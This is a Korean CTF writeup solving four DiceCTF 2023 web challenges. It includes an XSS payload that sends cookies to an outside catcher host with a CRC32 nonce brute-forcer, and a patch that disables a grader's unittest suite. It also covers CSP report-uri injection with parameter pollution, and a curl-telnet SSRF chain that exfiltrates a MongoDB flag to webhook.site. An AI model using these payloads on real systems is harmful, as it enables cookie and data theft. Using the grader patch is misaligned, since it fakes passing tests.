---
title: "[DiceCTF] Writeup"
categories:
  - ctf
tags:
  - dicectf
  - csp
  - writeup
  - dicectf writeup
  - iframe sandbox
  - codebox
  - recursive-csp 
  - HPP


toc: true
toc_sticky: true
toc_label: "Writeup"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/DiceCTF2023.png
---

💡 DiceCTF 2023 Writeup 입니다.
{: .notice--warning}

# recursive-csp

![image](https://user-images.githubusercontent.com/33647663/217253532-7df422e9-df02-419a-a7e3-68cff3590233.png)


```php
<?php
  if (isset($_GET["source"])) highlight_file(__FILE__) && die();

  $name = "world";
  if (isset($_GET["name"]) && is_string($_GET["name"]) && strlen($_GET["name"]) < 128) {
    $name = $_GET["name"];
  }

  $nonce = hash("crc32b", $name);
  header("Content-Security-Policy: default-src 'none'; script-src 'nonce-$nonce' 'unsafe-inline'; base-uri 'none';");
?>
```

사용자의 입력값이 화면에 그대로 나오며, 스크립트 실행을 위해서 CSP 값을 확인해보면 위의 php와 같이 처리한다.


```php
  $nonce = hash("crc32b", $name); # 사용자의 input 값을 crc32해시 처리
  header("Content-Security-Policy: default-src 'none'; script-src 'nonce-$nonce' 'unsafe-inline'; base-uri 'none';"); # 해시 값을 nonce의 값으로 이용한다.
```

nonce값을 맞출 수 있다면 스크립트 실행이 가능하다. 

문제의 제목이 recursive인 이유는 다음과 같이 페이로드를 바꾸면 계속 recursive하게 nonce값이 변경되기 때문.

만약 공격 페이로드를 다음과 같이 실행한다고 하자.

```html
<script nonce="123">
location.href="https://myoungseok.requestcatcher.com/"+document.cookie;
</script>
```

위의 스크립트의 crc32 실행값은 ```cb677c7e```이다. 즉 nonce="123"이 틀렸기 때문에 스크립트 실행이 안된다. 그래서 다음과 같이 nonce를 바꾸면

```html
<script nonce="cb677c7e">
location.href="https://myoungseok.requestcatcher.com/"+document.cookie;
</script>
```

또다시 nonce값이 바뀌었기 때문에 전체 crc32의 값이 ```44519347```로 바뀌어 버린다. 이런식으로 끊임없이 nonce를 바꾸면 다시 crc32값이 바뀌고 루프에 빠지게 된다.

하지만 crc32의 전체 값은 32bit 이므로 충돌을 유도해 볼만 하다.
즉 ```어떤``` nonce 값에 대해서는

```html
<script nonce="xxxxxxxx">
location.href="https://myoungseok.requestcatcher.com/"+document.cookie;
</script>
```

의 crc32 실행결과가 nonce값과 동일한 ```xxxxxxxx```가 나올 수 도 있다. 이 값을 brute force로 찾게 된다면 script를 실행할 수 있게된다.

실행에 사용한 코드는 다음과 같다. 

1스레드로 돌렸더니 시간이 너무 오래걸려서 16스레드를 사용하여 빠른 시간안에 충돌값을 찾아낼 수 있었다.

```py
import zlib
from multiprocessing import Pool

NUM_PROCESSES = 16


def get_crc32(data):
    return format(zlib.crc32(data.encode()), 'x')

def decimal_to_hex(decimal):
    return hex(decimal).split('x')[-1]

def work(idx):
    for nonce in range((0xffffffff//NUM_PROCESSES) *(idx),(0xffffffff//NUM_PROCESSES) *(idx+1)):
        script = f'''<script nonce="{decimal_to_hex(nonce)}">location.href="https://myoungseok.requestcatcher.com/"+document.cookie;</script>''' 
        tmp = get_crc32(script)
        if decimal_to_hex(nonce) == tmp:
            print(decimal_to_hex(nonce))
            break

if __name__ == '__main__':
    with Pool(NUM_PROCESSES) as p:
        p.map(work,[ x for x in range(NUM_PROCESSES)])

```

![image](https://user-images.githubusercontent.com/33647663/217259346-6744720c-f597-4154-9d4e-17b784916430.png)

충돌쌍을 찾을 수 있다.


# scorescope

문제에서 주어진 템플릿 파일의 기능을 구현을 요구한다.
더하기 함수를 ```return a+b```와 같이 작성하여 파일을 제출하면 

![image](https://user-images.githubusercontent.com/33647663/217486560-c43d3bdf-802d-42c3-9c70-4b6e6e84b0a3.png)


아래와 같이 test_add 테스트들을 통과하는 것을 확인할 수 있다.


![image](https://user-images.githubusercontent.com/33647663/217486422-3934366f-320c-4953-a458-2de867e74abf.png)

하지만 이 문제는 뒤의 문제들은 기능의 구현이 불가능한 문제들이 제시된다. factor()의 경우 소인수 분해를 요구하는 문제이고(n이 크다면 시간안에 끝나지 않음), preimage()함수는 주어진 해시값의 본래수를 구하는 함수이다(불가능). 그래서 이 문제는 어떻게든 이를 우회하여 전체 22개의 test case를 통과하는 문제이다.

본 문제에서 활용하는 개념은 ```__import__('__main__')```을 접근 가능하다면, 하위 함수를 변조하는것이 가능하다는 것을 이용한 문제이다.

우선 기본적으로 먼저 접근한 방법에서 시스템 함수의 실행이나, 다른 모듈의 import를 시도해봤지만 이 방법은 막혀있어서 시도한 방법이다. 해당 방법을 시도하면 다음과 같이 막힌다.

![image](https://user-images.githubusercontent.com/33647663/217488255-220f06e4-42f9-463a-8300-85c30a76985a.png)


먼저 다음과 같이 add()함수에 raise Exception을 통해서 원하는 출력 결과를 확인 할 수있다.

![image](https://user-images.githubusercontent.com/33647663/217490012-1f409157-7dec-410c-94e0-7f4f4ca84efe.png)

![image](https://user-images.githubusercontent.com/33647663/217489836-7115cad2-2f87-4e1a-a6f3-271ab23a291f.png)

```json
['SilentResult', 'SubmissionImporter', 'TestCase', 'TestLoader', 'TextTestRunner', '__annotations__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'current', 'f', 'json', 'stack', 'stderr', 'stdout', 'submission', 'suite', 'sys', 'test', 'tests']
```

해당 클래스와, 함수들을 몇개 분석을 해보면, ```suite, test, tests``` 함수들이 중요하게 보인다. 

main.suite를 출력을 해보면

![image](https://user-images.githubusercontent.com/33647663/217505462-e262005b-1037-4999-83e9-a482146d3c87.png)

unittest.suite.TestSuite 클래스의 객체임이 보이며,
파이썬의 unittest 프레임워크를 활용하여 사용자가 제시한 함수의 작동 유무를 판단하는 것을 알 수 있다. 

```html
Exception: [
    <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[None, None, <test_1_add.TestAdd testMethod=test_add_positive>]>, <unittest.suite.TestSuite tests=[]>]>, 
    <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, <unittest.suite.TestSuite tests=[<test_2_longest.TestLongest testMethod=test_longest_empty>, <test_2_longest.TestLongest testMethod=test_longest_multiple>, <test_2_longest.TestLongest testMethod=test_longest_multiple_tie>, <test_2_longest.TestLongest testMethod=test_longest_single>]>]>, 
    <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, <unittest.suite.TestSuite tests=[<test_3_common.TestCommon testMethod=test_common_consecutive>, <test_3_common.TestCommon testMethod=test_common_empty>, <test_3_common.TestCommon testMethod=test_common_many>, <test_3_common.TestCommon testMethod=test_common_nonconsecutive>, <test_3_common.TestCommon testMethod=test_common_single>]>]>,
    <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, <unittest.suite.TestSuite tests=[<test_4_favorite.TestFavorite testMethod=test_favorite>]>]>,
    <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, <unittest.suite.TestSuite tests=[<test_5_factor.TestFactor testMethod=test_factor_bigger>, <test_5_factor.TestFactor testMethod=test_factor_large>, <test_5_factor.TestFactor testMethod=test_factor_small>]>]>,
    <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, <unittest.suite.TestSuite tests=[<test_6_preimage.TestPreimage testMethod=test_preimage_a>, <test_6_preimage.TestPreimage testMethod=test_preimage_b>]>]>, 
    <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, <unittest.suite.TestSuite tests=[<test_7_magic.TestMagic testMethod=test_magic_a>, <test_7_magic.TestMagic testMethod=test_magic_b>, <test_7_magic.TestMagic testMethod=test_magic_c>]>]>,
    <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[<test_8_hidden.TestHidden testMethod=test_hidden>]>]>
    ]

```

위와 같은 구조로 TestSuite들이 구성되어 있으며, 각각의 테스트 함수는 ```testMethod=func``` 같은 구조로 제시됨을 알 수 있다. 따라서 모든 구조의 TestSuite에서 testMethod를 원하는 임의의 함수로 바꾼다면 테스트 통과를 우회할 수 있다.

풀이 코드는 다음과 같다. 코드는 [유튜브](https://www.youtube.com/watch?v=4SzJs2U9-2U)에 올라온 writeup 코드이다.

```py
def nop():
    return

def add(a, b):
    main = __import__('__main__')
    
    def nop_tests(suite):
        if suite == None:
            return

        if "_testMethodName" in suite.__dict__:
            suite.__dict__[suite.__dict__['_testMethodName']] = nop
            return

        for a in suite:
            nop_tests(a)

    nop_tests(main.suite)

    return a+b

```




![image](https://user-images.githubusercontent.com/33647663/217507168-30977520-f4d2-410b-920a-1446c4535c55.png)



# codebox

주요 개념들을 먼저 정리한다.

```js
const code = new URL(window.location.href).searchParams.get('code');
if (code) {
    const frame = document.createElement('iframe');
    frame.srcdoc = code;
    frame.sandbox = '';
    frame.width = '100%';
    document.getElementById('content').appendChild(frame);
    document.getElementById('code').value = code; 
}

const flag = localStorage.getItem('flag') ?? "flag{test_flag}";
document.getElementById('flag').innerHTML = `<h1>${flag}</h1>`;
```

위의 코드는 client script 코드이며, 새로운 iframe을 만들고 사용자 입력값(code)를 srcdoc에 입력하여 iframe을 생성한다. 이 부분에서 주요한 부분은 sandbox 부분이다.

💡 iframe sandbox는 iframe을 샌드박스화(고립) 시키는 기술로써, sandbox 옵션을 주고 아무런 값을 주지 않으면 허용정책을 하나도 주지 않은 상태로 원하는 기능 대부분이 실행되지 않는다. 주요 정책으로는 'allow-scripts', 'allow-same-origin'등이 있으며 이러한 정책이 주어지지 않아서 공격지점으로 잡기에는 난이도가 너무 높다(거의 불가능해 보임)
{: .notice--success}

```js
fastify.get('/', (req, res) => {
    const code = req.query.code;
    const images = [];

    if (code) {
        const parsed = HTMLParser.parse(code);
        for (let img of parsed.getElementsByTagName('img')) {
            let src = img.getAttribute('src');
            if (src) {
                images.push(src);
            }
        }
    }

    const csp = [
        "default-src 'none'",
        "style-src 'unsafe-inline'",
        "script-src 'unsafe-inline'",
    ];

    if (images.length) {
        csp.push(`img-src ${images.join(' ')}`);
    }

    res.header('Content-Security-Policy', csp.join('; '));

    res.type('text/html');
    return res.send(box);
});
```

img 태그의 src 속성으로 입력된 값을 파싱하여 csp 항목에 그대로 추가해준다. 이를 이용해서 csp에 원하는 directive들을 추가할 수 있다. 이번 문제에서 사용한 directive는 report-uri (report-to) directive 이다.

💡 report-uri(현재는 report-to로 대체됨)는 만약 해당 페이지에서 csp 정책에 의해서 차단이 되는 항목이 있다면 해당 directive에서 지정한 주소로 어떠한 정책에 의해서 차단되었고,등등의 결과를 리포팅 해주는 기능이다. 
{: .notice--success}


---
문제에서 스크립트를 실행하면 다음과 같이 실행되지 않는다.

![image](https://user-images.githubusercontent.com/33647663/217264764-f24a1cf5-5a42-4375-ba98-3d8ad160795f.png)

콘솔에 출력된 에러 로그는 다음과 같다.

```Blocked script execution in 'about:srcdoc' because the document's frame is sandboxed and the 'allow-scripts' permission is not set.```

iframe이 샌드박스 옵션이 주어져있고, 'allow-scripts' 옵션이 주어져 있지 않기 때문에 iframe 안에서는 script 실행이 불가능 하다는 의미이다. 실제 ctf를 할때는 이를 우회해서 스크립트 실행이 가능하도록 하는 방법이 존재하는지 찾기 위해 노력했는데, 끝나고 나서 보니 이는 거의 불가능한 방법인거 같다.

이를 우회하는 방법으로 본 문제에서 사용된 기법은 report-uri csp 지시자 이다. 현재 csp 값을 변조 가능하기 때문에, report-uri 값을 나의 서버로 바꾸고 csp를 위반하면 어떻게 오는지 확인해 본다.


![image](https://user-images.githubusercontent.com/33647663/217267206-5d224a9b-4006-462f-9058-12089e4b8014.png)

위와같이 코드를 작성하면, 다음과 같이 csp값이 변조되어 report-uri 값이 삽입되는 것을 확인할 수 있고

![image](https://user-images.githubusercontent.com/33647663/217267427-a232cb22-1279-4bdf-9ee6-a5b273401750.png)

report-uri로 지정한 주소로 다음과 같이 csp-report 패킷이 전송되는 것을 볼 수 있다.

![image](https://user-images.githubusercontent.com/33647663/217267702-1f87a230-57d6-4270-b4d7-6e9a068d1fcc.png)


다음과 같이 csp위반정보가 서버로 전송된다. 

```json
{
  "document-uri": "about",
  "referrer": "",
  "violated-directive": "object-src",
  "effective-directive": "object-src",
  "original-policy": "default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src http://example.com; report-uri https://myoungseok.requestcatcher.com",
  "disposition": "enforce",
  "blocked-uri": "https://not-example.com",
  "status-code": 0,
  "script-sample": ""
}
```

---
우리는 flag정보를 읽어야 한다. 다시 클라이언트에서 실행되는 스크립트를 본다.

```js
const code = new URL(window.location.href).searchParams.get('code');
if (code) {
    const frame = document.createElement('iframe');
    frame.srcdoc = code;
    frame.sandbox = '';
    frame.width = '100%';
    document.getElementById('content').appendChild(frame);
    document.getElementById('code').value = code; 
}

const flag = localStorage.getItem('flag') ?? "flag{test_flag}";
document.getElementById('flag').innerHTML = `<h1>${flag}</h1>`;
```

가장 마지막에 두줄을 보면 flag변수에 flag 값이 담기고, 이를 innerHTML에 넣음으로써 플래그가 출력된다. 그렇다면 가장 마지막줄 innerHTML줄에서 오류가 발생하여 report-uri 가 전송된다면 flag가 평문값으로 서버에 전송될 것이다. 

마지막 줄을 csp 지시자를 위반하도록 설정하기 위해서 csp 지시자중 ```require-trusted-types-for```이라는 지시자를 사용한다.


💡 require-trusted-types-for  csp 지시자란, injection sinks(ex. Element.innerHTML, Location.hrefs .... 등 60여가지) 부분에 들어가는 문자열들을 검증된 타입인지(trusted types) 검증해야만 들어갈 수 있도록 하는 강력한 xss 방어 정책이다. 
{: .notice--success}

이를 이용해서 다음과 같이 작성하여, 실행한다.

![image](https://user-images.githubusercontent.com/33647663/217272659-5407ad20-23a1-4c08-bdfc-9995ba78790e.png)

예상과 같이 csp가 변조되었다.

![image](https://user-images.githubusercontent.com/33647663/217272844-a63ade2f-d991-4dca-b8fe-75d9788e0dff.png)

또한 콘솔에 나온 로그를 보면 다음과 같이 TrustedHTML 지시자 위반로그가 발생한 것을 확인 할 수 있다.

![image](https://user-images.githubusercontent.com/33647663/217273086-cd933693-e110-4dc6-98c4-d0bb5c0985cc.png)

발생지점을 확인해보자.

![image](https://user-images.githubusercontent.com/33647663/217273314-d41e7049-c284-4cc8-97d2-8a58f3adbfa5.png)

우리는 마지막줄인 58번째에서 오류가 발생해야 하는데, 그 이전에 50번째 줄에서도 Injection sinks 부분이 존재하기 때문에 해당 지점에서 먼저 오류가 발생해버린다. 

if(code) 부분이 실행되지 않도록 하면 우회가 가능하다.

이를 우회하기 위해서 HPP(Http Parameter Pollution) 기법을 활용한다.

💡 HPP는 동일한 매개변수의 이름으로 서버에 요청을 보낼때 이를 다르게 처리하는 로직을 이용하여 검증로직을 우회하는 기법이다. 현재 우리는 클라이언트의 javascript 코드와 서버의 fastify에서 매개변수 처리하는 방버빙 다른것을 이용하여 우회를 시도한다.
{: .notice--success}

만약 사용자가 /?code=&code=123 이라고 전송을 했을때, 서버와 사용자의 처리결과를 확인한다.

- Server

```js
const code = req.query.code; // code=123
const images = [];
```

- Client

```js
const code = new URL(window.location.href).searchParams.get('code'); // code=''
```

즉 Client에서의 code는 첫 번째 매개변수의 값(공백)이 되고, 서버에서 Code는 두 번째 매개변수의 값(123)이 되어 처리 로직의 우회가 가능해 진다.

---

최종적으로 HPP 기법까지 이용하여 우리가 원하는 지점인 58번째 라인에서 CSP 지시자 위반을 유도하면 다음과 같이 플래그를 획득할 수 있다.

![image](https://user-images.githubusercontent.com/33647663/217275610-2ae364b2-07e0-4f48-bfc2-f271bcb3b8f2.png)

# unfinished

이 문제는 처음에 아무리 봐도 뭐를 하라고 하는지 감을 못잡았던 문제이다. 문제를 만든사람의 WriteUp을 보고나서야 이해했는데 꽤 난이도가 있던 문제였다. 

우선 해당 문제에서 제시된 route는 ```/```, ```/api/login```, ```/api/ping``` 3개이다. 이 중에서 ```/api/ping```을 호출하기 위해서는 다음 함수의 통과가 필요하다. 

```py
const requiresLogin = (req, res, next) => {
    if (!req.session.user) {
        res.redirect("/?error=You need to be logged in");
    }
    next();
};
```

여기에서 문제가 발생하는데, 사용자의 세션정보가 없으면 res.redirect() 함수를 호출하지만, return을 하지 않는다. 즉, 해당 코드는 사용자에게는 "error=You need to be logged in" 이라는 메시지가 전송되지만 실제로는 그 뒤에 Ping 명령어가 실행이 된다.

즉, 이 문제는 /api/ping 함수 내부의 curl 명령어를 통해서 ```SSRF``` 형태의 공격을 이용하여 내부 네트워크 mongodb의 flag를 가져오면 된다.

우선 /api/ping을 보자

```py
app.post("/api/ping", requiresLogin, (req, res) => {
    let { url } = req.body;
    if (!url || typeof url !== "string") {
        return res.json({ success: false, message: "Invalid URL" });
    }


    try {
        let parsed = new URL(url);
        if (!["http:", "https:"].includes(parsed.protocol)) throw new Error("Invalid URL");
    }
    catch (e) {
        return res.json({ success: false, message: e.message });
    }

    const args = [ url ];
    let { opt, data } = req.body;
    if (opt && data && typeof opt === "string" && typeof data === "string") {
        if (!/^-[A-Za-z]$/.test(opt)) {
            return res.json({ success: false, message: "Invalid option" });
        }

        // if -d option or if GET / POST switch
        if (opt === "-d" || ["GET", "POST"].includes(data)) {
            args.push(opt, data);
        }
    }

    cp.spawn('cURL', args, { timeout: 2000, cwd: "/tmp" }).on('close', (code) => {
        // TODO: save result to database
        res.json({ success: true, message: `The site is ${code === 0 ? 'up' : 'down'}` });
    });
});
```

사용자의 request 에서 총 3개의 매개변수를 입력받는다. 또한 각각의 조건을 정리하면 다음과 같다.

1. url : http:, https: 로 protocol scheme이 시작되어야 한다.
2. opt : -[a~Z] 한글자의 옵션만 가능하다.
3. opt & data : 1)opt 가 -d 이거나 data 가 GET or POST 이어야 한다.

이러한 조건들을 만족시키면, ```curl```명령어를 실행시키며 그 형태는 다음과 같다.

```bash
curl <url> <opt> <data>
```

이러한 제약조건 상에서 우선 어떻게 curl 명령어를 통해서 내부 mongodb의 데이터를 빼올 수 있을까? 방법으로는 gopher scheme이나 telnet scheme을 이용하는 방법이 있다. 하지만, dockerfile에 보면 gopher를 disable 시켜놨기 때문에 본 문제에서는 telnet을 이용하여 공격을 수행하였다.

다음과 같은 scheme을 이용한다면 raw data를 이용하여 mongodb와 통신이 가능하다

```bash
# payload.raw에는 mongodb 명령어를 실행할 수 있는 raw 데이터가 필요함
curl telnet://mongodb:27017 -T payload.raw
```

우선 payload.raw 데이터는 wireshark를 이용한 패킷 캡쳐를 통해서 구할 수 있다. 

docker로 서버와 동일하게 mongodb 환경을 만들어 놓은 다음 해당 mongodb에서 쿼리문을 통해서 flag를 획득하는 페이로드를 생성해 보자

```bash
# 1. 도커환경 실행
docker run -i -p 27017:27017 -t mongo:latest

# 2. 해당 mongodb에 실제 문제와 동일하게 collection, data 생성
mongo localhost
> use secret
> db.createCollection("flag")
> db.flag.insert({"flag":"dice{test_flag}"})

# 3. mongo clinet를 이용해서 해당 플래그를 요청하는 쿼리문 작성
mongo --eval "db.getSiblingDB('secret').flag.find({})"
```

이때 마지막 쿼리문을 실행하는 순간의 패킷을 wireshark로 캡쳐한다.

![image](https://user-images.githubusercontent.com/33647663/218099070-caa41cfb-ada2-49ee-98ef-0d49bc134fe9.png)

해당 raw 데이터를 payload.raw로 저장한다.

curl 명령어를 이용해서 payload.raw 데이터를 이용한 쿼리문은 다음과 같다.

```bash
# --max-time을 안해주면 대상 서버에서 계속 명령어를 실행하는 것으로 인식하여 데이터 출력이 되지 않는다. 강제로 timeout시켜서 데이터를 출력시킨다.
curl telnet://localhost:27017 -T payload.raw --max-time 1
```

![image](https://user-images.githubusercontent.com/33647663/218099668-3595cdfa-ea8d-4808-9bca-86e63a8144f8.png)


---

문제에서 opt, data를 사용하는데 제약조건이 존재한다. 이를 우회하기 위해서 -K 옵션을 활용하면 된다. 

-K 옵션을 curl 명령어의 옵션들을 파일에서 불러오는 명령어로, 이를 이용하면 로컬에 저장된 파일을 통해서 필터링을 우회하여 모든 curl 옵션들의 활용이 가능해진다. 

총 공격 process는 다음과 같다

```py
# 1. 대상 서버에 payload.raw 파일을 업로드한다. (GET 파일)
# 코드를 업로드한 나의 웹서버 101.101.218.209:20001
url : http://101.101.218.209:20001/payload.raw
opt : -o
data : GET 
```

```py
# 2. Raw 파일을 이용하여 mongo서버로 페이로드를 전송하는 curl 명령어에 필요한 옵션이 담긴 파일을 업로드 한다(POST 파일)
url : http://101.101.218.209:20001
opt : -o
data : POST

# 해당 웹페이지가 반환하는 내용은 다음과 같다.
"""
-o /dev/null
-T /dev/null
--max-time 1
--url telnet://mongodb:27017
-o GET
-T GET
"""

# 해당 config 파일을 이용한 curl 명령어를 실행하면 기존 GET파일에는 payload.raw 데이터가 들어가 있었고, 실행 결과에는 payload.raw명령어를 실행하여 그 결과같으로 flag 가 담긴 정보가 저장될 것이다.
```

```py
# 3. 2번에서 받은 페이로드 파일을 이용한 curl 명령어 실행
url : http://www.example.com
opt : -k
data : POST
```

```py
# 4. 3번 실행 결과로 flag정보가 GET파일에 존재한다. GET 파일 내용을 읽어 온다.
url : www.webhook.site
opt : -T
data : GET
```

위의 순서대로 공격 수행시 webhook.site에서 플래그 확인이 가능하다.

![image](https://user-images.githubusercontent.com/33647663/218101814-23d66ef7-1f71-4324-a80a-1f5dca41bddd.png)


